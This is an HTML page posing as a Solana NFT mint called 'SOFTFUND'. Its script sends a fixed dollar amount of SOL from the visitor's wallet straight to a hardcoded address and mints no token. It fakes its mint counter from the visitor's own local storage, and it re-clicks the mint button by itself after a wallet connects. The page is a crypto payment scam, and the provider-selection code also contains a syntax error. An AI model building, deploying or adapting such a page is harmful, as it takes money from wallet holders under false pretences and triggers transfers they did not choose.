<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>SOFTFUND – $2.6356</title>
<style>
  body{margin:0;background:#0c0b1a;font-family:system-ui;color:#fff;display:grid;place-items:center;min-height:100vh;padding:15px}
  .c{max-width:380px;background:#141222;padding:32px;border-radius:20px;text-align:center;border:1px solid #369}
  .t{font-size:2rem;font-weight:800}
  .p{font-size:2.4rem;color:#0f9;margin:16px 0;font-weight:800}
  .b{width:100%;padding:22px;background:#00ff9d;color:#000;border:none;border-radius:16px;font-weight:800;font-size:1.5rem;cursor:pointer;margin:20px 0;touch-action:manipulation}
  .s{margin-top:12px;font-weight:600;min-height:28px;color:#0f9}
  .l{width:12px;height:12px;border:2px solid #0f9;border-top-color:#000;border-radius:50%;display:inline-block;animation:r 1s linear infinite}
  @keyframes r{to{transform:rotate(360deg)}}
</style></head><body>
<div class="c">
  <div class="t">SOFTFUND</div>
  <div style="color:#aaa">10,000 NFTs • Mainnet</div>
  <div class="p">$2.6356</div>
  <div style="color:#666;font-size:0.9rem" id="sol">~0.017 SOL</div>
  <div>Minted: <span id="m">0</span>/10,000</div>
  <button class="b" id="btn">TAP TO MINT</button>
  <div id="s" class="s"></div>
</div>

<script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
<script>
  const USD = 2.6356;
  const YOU = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
  const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
  const s = document.getElementById("s");
  const m = document.getElementById("m");
  const sol = document.getElementById("sol");
  let count = parseInt(localStorage.getItem("sf")||"0");
  let buyers = JSON.parse(localStorage.getItem("buyers")||'[]');
  let lamports = 0;
  m.innerText = count;

  async function price() {
    try {
      const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
      const j = await r.json();
      const p = j.solana.usd;
      const amt = USD / p;
      lamports = Math.ceil(amt * 1e9);
      sol.textContent = "~"+amt.toFixed(5)+" SOL";
    } catch(e) {}
  }
  price(); setInterval(price, 10000);

  function getProvider() {
    return window.solana?.isPhantom ? window.solana :
           window.solana?.isSolflare ? window.solana :
           window.backpack ? window.backpack :
           window.trustwallet?.Provider?.solana :
           window.ethereum?.isMetaMask ? window.ethereum :
           window.okxwallet || window.rainbow || window.braveSolana || null;
  }

  document.getElementById("btn").onclick = async () => {
    const p = getProvider();
    if (!p) { s.innerHTML = "Open in Phantom/Trust/OKX"; return; }
    s.innerHTML = "Connecting… <span class='l'></span>";
    try {
      if (!p.isConnected) await p.connect();
      s.innerHTML = "Sending $2.6356… <span class='l'></span>";
      const tx = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: p.publicKey,
          toPubkey: new solanaWeb3.PublicKey(YOU),
          lamports
        })
      );
      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
      const sig = await p.signAndSendTransaction(tx);
      await conn.confirmTransaction(sig);
      buyers.push({addr: p.publicKey.toBase58(), tx: sig});
      localStorage.setItem("buyers", JSON.stringify(buyers));
      count++; localStorage.setItem("sf", count); m.innerText = count;
      s.innerHTML = `MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#0f9">View</a>`;
      if (count >= 10000) alert("10,000! NFTs dropping…");
    } catch(e) {
      s.innerHTML = "Cancelled or error";
    }
  };

  // Auto-run on mobile return
  setTimeout(() => { if (getProvider()?.isConnected) document.getElementById("btn").click(); }, 1200);
</script>
</body></html>